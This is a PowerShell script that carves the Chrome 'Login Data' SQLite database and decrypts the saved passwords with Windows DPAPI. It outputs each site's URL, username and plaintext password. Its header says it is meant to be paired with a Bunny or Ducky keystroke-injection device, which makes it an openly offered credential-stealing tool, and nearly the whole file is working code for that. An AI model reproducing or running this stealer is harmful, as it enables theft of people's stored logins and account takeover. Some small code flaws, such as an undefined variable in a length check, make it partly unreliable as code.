##
#  Name:    Get-ChromeCreds2.ps1
#  Author:  Kerry Milan
#  Date:    2017/04/28
#  Version: 1.0
#  Changelog:
#   - 1.0: Initial version
#
#  Parse a SQLite database containing Google Chrome credentials
#
#  This script traverses a SQLite database to carve records containing
#  entries in the 'logins' table.  It will only function when run by the
#  user who owns the database being processed.  
# 
#  It is intended to be paired with a Bunny or Ducky script.  
##

# Use the default location in the current user's profile
$User = $Env:USERPROFILE
$DbFile = "$User\AppData\Local\Google\Chrome\User Data\Default\Login Data"
$Stream = New-Object IO.FileStream -ArgumentList "$DbFile", 'Open', 'Read', 'ReadWrite'

Add-Type -AssemblyName System.Security
$Encoding = [System.Text.Encoding]::GetEncoding(28591)
$StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding
$BinaryText = $StreamReader.ReadToEnd()

$StreamReader.Close()
$Stream.Close()

## 
#  Length of various non-string field types in a record.  Derived from 
#  https://www.sqlite.org/fileformat2.html#record_format
##
$SerialMap = [Ordered]@{0=0; 1=1; 2=2; 3=3; 4=4; 5=5; 6=6; 7=8; 8=0; 9=0}

##
#  Convert a byte array to int32
##
Function ToInt($ByteArray)
{    
    # Nothing to do if array is empty; necessary since check is at end of loop.
    If ($ByteArray.Length -eq 0) { Return 0 }

    [int32] $Int = 0
    $x = 0

    # Read $ByteArray one byte at a time, appending to $Int
    Do
    {
        $Int = ($Int -shl 0x8) -bor ($ByteArray[$x++])
    } While ($x -lt $ByteArray.Length)

    Return $Int
}

##
#  Convert a Varint field to int32.  See 
#  https://www.sqlite.org/fileformat2.html#varint for more detail
##
Function ParseVarint($ByteArray, [ref]$VarintSize)
{
    [int32] $Val = 0
    $x = 0

    Do 
    {
        $Byte = $ByteArray[$x++]

        # Shift $Val left by 7 bits, then append the least significant 7 bits 
        # of the current byte.
        $Val = ($Val -shl 0x7) -bor ($Byte -band 0x7F)

    # Continue if 1) we haven't processed 8 bytes already, and 2) the high-order 
    # bit of the current byte is 1.
    } While ($x -lt 8 -and ($Byte -band 0x80))

    $VarintSize.Value = $x
    Return $Val
}
# When maintaining an offset from the start of an array, we must
# track the number of bytes used by a Varint.  A reference to this field is 
# passed with each call to ParseVarint() and should be recorded immediately
# upon return.
[ref]$VarintSize = 0


## 
#  Parse a database page.  For carving purposes, only 0x0D (Table Leaf) pages 
#  are of relevance.  
# 
#  $Page is a byte array whose length matches address 0x10 in the file header.  
#  Table Leaf pages have a header of length 0x08.  
#
#  The header defines the number of cells and is succeeded by a sequence of 
#  two-byte integers representing the offsets of those cells from the beginning 
#  of the page.
##
Function ParsePage($Page)
{
    If ($Page[0] -ne 0x0D) { Return }

    $NumCells = ToInt $Page[0x3..0x4]
    $CellAddrStart = 0x8
    $CellAddrStop = $CellAddrStart + ($NumCells * 2) - 1

    For ($x = $CellAddrStart; $x -le $CellAddrStop; $x += 2)
    {
        $CellAddr = ToInt ($Page[$x .. ($x + 1)])
        ParseCell($Page[$CellAddr .. $Page.Length])
    }
}

##
#  Parse a Table Leaf cell.  
# 
#  Format:
#  <varint>             <varint>    <byte-array>    <int32>
#  (# bytes payload)    (row id)    (payload)       (overflow page)
# 
#  Currently, this script does not parse overflow pages.
##
Function ParseCell($Cell)
{   
    $Offset = 0

    # Payload Length varint
    $PayloadLength = ParseVarint ($Cell[$Offset .. ($Offset + 4)]) $VarintSize
    $Offset += $VarintSize.Value

    # Row ID varint
    $RowID = ParseVarint ($Cell[$Offset .. ($Offset + 4)]) $VarintSize 
    $Offset += $VarintSize.Value 


    If (($Offset + $Payload.Length) -le $Cell.Length)
    {
        ParsePayload $Cell[$Offset .. ($Offset + $PayloadLength - 1)]
    }
}

##
#  Parse the cell's payload.
# 
#  The first bytes are a varint indicating the size of the payload's 
#  header, starting from address 0x0.  Following that, a series of 
#  fields describe the type and length of each field.  The payload body
#  begins immediately after.
#
#  Ref: https://www.sqlite.org/fileformat2.html#record_format
##
Function ParsePayload($Payload)
{
    If ($Payload.Length -eq 0) { Return }

    [ref]$VarintSize = 0
    $HeaderLength = ParseVarint $Payload[0 .. 8] $VarintSize  # Header length includes length varint
    $Offset = $VarintSize.Value

    # Starting from the beginning of the payload's field definition, build a list of 
    # the fields and their respective lengths.  
    # 
    # The sequence of these fields for the logins table is known (and defined below),
    # but the length of each string field is specific to each record.
    # 
    # Field order:
    # <origin_url> <return_url> <username_field> <username> <password_field> <password> ...
    # 
    # If this order ever changes, it can be read from the sqlite_master table in Page 1
    $FieldSeq = @()
    For ($y = $Offset; $y -lt $HeaderLength; $y++)
    {
        $Serial = ParseVarint $Payload[$y .. ($y + 8)] $VarintSize
        $y += $VarintSize.Value - 1

        Switch ($Serial)
        {
            #A-0xB are not used by the current SQLite version
            {$_ -lt 0xA} { $Len = $SerialMap[$Serial]; break }
            {$_ -gt 0xB} 
            { 
                # Even numbers of length 0xC or greater indicate a blob field whose
                # (base-10) length is double the value of ($Serial minus 0xC).  
                # Similarly, odd numbers signify strings fields.
                If ($Serial % 2 -eq 0) { $Len = (($Serial - 0xC) / 2) }
                Else { $Len = (($Serial - 0xD) / 2) }
            }
        }
        $FieldSeq += $Len
    }

    # Additional fields can be added to the output if desired.  For now, only origin_url, 
    # username and password are returned.
    $Offset = $HeaderLength
    For ($f = 0; $f -lt $FieldSeq.Length; $f++)
    {
        $Str = $Encoding.GetString($Payload[$Offset .. ($Offset + $FieldSeq[$f] - 1)])
        If ($f -eq 0) { $URL = $Str }
        ElseIf ($f -eq 3) { $Username = $Str }
        ElseIf ($f -eq 5) { $Password = DecodePassword($Payload[$Offset .. ($Offset + $FieldSeq[$f] - 1)]) }
        $Offset += $FieldSeq[$f]
    }

    # No record is printed if both the username and password are not present.
    If ($Username.Length -gt 0 -and $Password.Length -gt 0) 
    { 
        $PW = New-Object System.Object
        $PW | Add-Member -type NoteProperty -name URL -value $URL
        $PW | Add-Member -type NoteProperty -name Username -value $Username
        $PW | Add-Member -type NoteProperty -name Password -value $Password      
        $PW
    }
}

##
#  Decode the password using Windows' crypto functions.  This will only be successful if 
#  the database belongs to the currently logged-in user.
# 
#  For invalid records, an empty string is returned.
##
Function DecodePassword($Password)
{
    $P = $Encoding.GetBytes($Password)
    Try
    {
        $Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Password,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        Return [System.Text.Encoding]::Default.GetString($Decrypt)
    }
    Catch { Return "" }

}

# Verify the header; exit if $DbFile is not a SQLite database.
If ((Compare-Object $BinaryText[0x0 .. 0x5] @('S', 'Q', 'L', 'i', 't', 'e')) -ne $null)
{
    Break
}

# Grab the number of pages and page size out of the header
$NumPages = ToInt($BinaryText[0x1C .. 0x1F])
$PageSize = ToInt($BinaryText[0x10 .. 0x11])

# Start at Page 3 since Page 1 contains the sqlite_master table and Page 2 is a Ptrmap page 
For ($x = 0x2; $x -lt $NumPages; $x++)
{
    $PageStart = ($x * $PageSize)
    ParsePage $BinaryText[$PageStart .. ($PageStart + $PageSize - 1)]
}
